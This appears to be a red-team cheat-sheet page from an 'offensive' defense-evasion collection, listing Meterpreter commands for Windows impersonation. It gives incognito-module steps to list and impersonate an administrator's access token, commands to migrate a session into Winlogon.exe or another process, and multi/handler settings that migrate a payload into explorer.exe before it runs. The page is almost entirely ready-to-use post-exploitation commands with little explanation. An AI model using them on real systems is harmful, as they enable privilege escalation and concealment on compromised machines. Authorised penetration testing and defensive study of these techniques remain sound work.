---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/impersonate
---

# Impersonate

## Meterpreter

### Incognito

With incognito module on meterpreter

```ruby
meterpreter > load incognito 
meterpreter > list_tokens -u
meterpreter > impersonate_token Vulnableone\\admin
meterpreter > rev2self 
```

### Migration

```ruby
meterpreter > migrate 274
meterpreter > migrate -N Winlogon.exe
```

We can specify target application to migrate before payload execute

```ruby
msf6 exploit(multi/handler) > set PrependMigrate true
msf6 exploit(multi/handler) > set PrependMigrateProc explorer.exe
msf6 exploit(multi/handler) > set AutoRunScript migrate -f
```
